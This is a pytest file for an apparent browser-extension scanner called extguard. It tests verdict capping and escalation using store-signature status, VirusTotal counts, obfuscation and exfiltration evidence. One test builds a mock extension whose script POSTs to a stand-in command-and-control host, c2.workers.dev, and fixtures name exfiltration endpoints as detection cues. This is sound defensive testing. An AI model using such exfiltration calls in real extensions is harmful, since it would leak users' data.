# tests/test_verdict.py - evidence-based verdicts (extguard/verdict.py)
#
# Real-extension test (2026-10-07): genuine Bitwarden, Grammarly, uBlock
# Origin Lite, Dark Reader and React Developer Tools builds all scored
# CRITICAL on permissions alone. Dangerous permissions now cap the verdict
# unless there is evidence of malicious behaviour.

import hashlib
import io
import json
import struct
import zipfile
from unittest.mock import patch

import pytest

from extguard import main, verdict

VERIFIED = {"id_source": "crx3-signed-id", "store_relation": "identical", "cws_exists": True}


def _assess(pub=None, osv=None, vel=None, code=None, errors=None):
    return verdict.assess(pub or dict(VERIFIED), osv or {}, vel or {}, code or {}, errors)


class TestCaps:
    def test_verified_store_build_without_evidence_caps_at_medium(self):
        a = _assess()
        assert a["max_level"] == "medium" and a["verified_store_build"]
        assert verdict.apply_cap(100, a) == 44
        assert verdict.apply_cap(30, a) == 30  # a low score is never raised

    @pytest.mark.parametrize(
        "pub, why",
        [
            ({"id_source": None}, "no Web Store signature"),
            ({"id_source": "manifest-key"}, "no Web Store signature"),
            ({"id_source": "crx3-signed-id", "cws_exists": None}, "not checked"),
            (
                {"id_source": "crx3-signed-id", "cws_exists": True,
                 "store_relation": "older_than_store"},
                "older version",
            ),
        ],
    )  # fmt: skip
    def test_unverifiable_build_caps_at_high(self, pub, why):
        a = _assess(pub=pub)
        assert a["max_level"] == "high" and not a["verified_store_build"]
        assert why in a["reason"]
        assert verdict.apply_cap(100, a) == 69


class TestEvidenceLiftsTheCap:
    @pytest.mark.parametrize(
        "kwargs, needle",
        [
            ({"code": {"profile": {"exfil_endpoints": ["x.workers.dev"]}}}, "exfil"),
            ({"code": {"new_exfil_endpoints": ["x.workers.dev"]}}, "an update started"),
            ({"code": {"profile": {"obfuscated_files": ["bg.js"]}}}, "obfuscated"),
            ({"code": {"profile": {"apis": {"remote importScripts": 1}}}}, "remote server"),
            ({"osv": {"cdn_refs": ["https://unpkg.com/x@1"]}}, "CDN"),
            ({"osv": {"vt": {"found": True, "malicious": 3}}}, "VirusTotal: 3"),
            ({"pub": {**VERIFIED, "identity_conflict": True}}, "contradicts its signature"),
            ({"pub": {**VERIFIED, "store_relation": "tampered"}}, "tampered"),
            ({"pub": {**VERIFIED, "suspicious_update": True}}, "attacker-style host"),
        ],
    )
    def test_evidence(self, kwargs, needle):
        a = _assess(**kwargs)
        assert a["max_level"] is None
        assert any(needle in e for e in a["evidence"])
        assert verdict.apply_cap(100, a) == 100

    def test_a_tampered_build_is_never_verified(self):
        assert not _assess(pub={**VERIFIED, "store_relation": "tampered"})["verified_store_build"]


class TestAnomaliesCapAtHigh:
    @pytest.mark.parametrize(
        "kwargs, needle",
        [
            ({"osv": {"vt": {"found": True, "malicious": 1}}}, "1 engine"),
            ({"pub": {**VERIFIED, "store_relation": "newer_than_store"}}, "newer than"),
            ({"pub": {**VERIFIED, "update_url_ok": False}}, "outside the Chrome Web Store"),
            ({"pub": {**VERIFIED, "cws_exists": False}}, "not published"),
            ({"vel": {"is_suspicious": True}}, "version change"),
            (
                {"code": {"new_hosts": ["new.example"], "new_apis": ["chrome.cookies"]}},
                "new endpoints and sensitive APIs",
            ),
            ({"errors": {"1f": "boom"}}, "Stage 1f failed"),
        ],
    )
    def test_anomaly(self, kwargs, needle):
        a = _assess(**kwargs)
        assert a["max_level"] == "high"
        assert any(needle in x for x in a["anomalies"])

    def test_a_new_host_alone_is_not_an_anomaly(self):
        """Updates add endpoints all the time; review_needed handles that."""
        assert _assess(code={"new_hosts": ["cdn.example"], "new_apis": []})["max_level"] == "medium"


# ---------------------------------------------------------------------------
# End to end: a powerful extension that IS the genuine store build
# ---------------------------------------------------------------------------

GRAMMARLY_LIKE = {
    "manifest_version": 3,
    "name": "Writing Assistant",
    "version": "14.1.0",
    "permissions": ["cookies", "tabs", "storage", "scripting", "identity"],
    "host_permissions": ["http://*/*", "https://*/*"],
    "background": {"service_worker": "bg.js"},
}


def _crx(manifest: dict, code: str = "chrome.storage.local.get('x');") -> bytes:
    def pb(field, payload):
        def varint(v):
            out = b""
            while True:
                b, v = v & 0x7F, v >> 7
                if v:
                    out += bytes([b | 0x80])
                else:
                    return out + bytes([b])

        return varint((field << 3) | 2) + varint(len(payload)) + payload

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("manifest.json", json.dumps(manifest))
        zf.writestr("bg.js", code)
    key = b"developer-key"
    header = pb(2, pb(1, key)) + pb(10000, pb(1, hashlib.sha256(key).digest()[:16]))
    return b"Cr24" + struct.pack("<I", 3) + struct.pack("<I", len(header)) + header + buf.getvalue()


def _scan_against_store(tmp_path, capsys, crx: bytes, store_sha: str, store_version="14.1.0"):
    path = tmp_path / "ext.crx"
    path.write_bytes(crx)
    store = {"exists": True, "version": store_version, "sha256": store_sha}
    with (
        patch("extguard.publisher_checker._query_cws", return_value=store),
        patch("extguard.osv_lookup._query_osv_packages_batch", return_value=([], None)),
    ):
        main.main([str(path), "--json", "--no-ai"])
    return json.loads(capsys.readouterr().out)


class TestEndToEnd:
    def test_powerful_genuine_store_build_is_medium(self, tmp_path, capsys, temp_history_file):
        crx = _crx(GRAMMARLY_LIKE)
        report = _scan_against_store(tmp_path, capsys, crx, hashlib.sha256(crx).hexdigest())
        assert report["stage_1_checks"]["permission_score"]["total"] >= 70  # still reported
        assert report["risk_level"] == "medium"
        assert report["verdict"]["verified_store_build"] is True
        assert report["verdict"]["uncapped_score"] >= 70
        # A MEDIUM verdict is baselined, so its NEXT update gets code-diffed
        assert report["baseline"]["recorded"] is True

    def test_same_package_tampered_is_critical(self, tmp_path, capsys, temp_history_file):
        report = _scan_against_store(tmp_path, capsys, _crx(GRAMMARLY_LIKE), "0" * 64)
        assert report["stage_1_checks"]["publisher"]["store_relation"] == "tampered"
        assert report["risk_level"] == "critical"
        assert any("tampered" in e for e in report["verdict"]["evidence"])

    def test_genuine_store_build_that_exfiltrates_is_critical(
        self, tmp_path, capsys, temp_history_file
    ):
        """TeamPCP shape: store-published, signed - but the code ships data out."""
        crx = _crx(GRAMMARLY_LIKE, "fetch('https://c2.workers.dev/x', {method: 'POST'});")
        report = _scan_against_store(tmp_path, capsys, crx, hashlib.sha256(crx).hexdigest())
        assert report["verdict"]["verified_store_build"] is True
        assert report["risk_level"] == "critical"
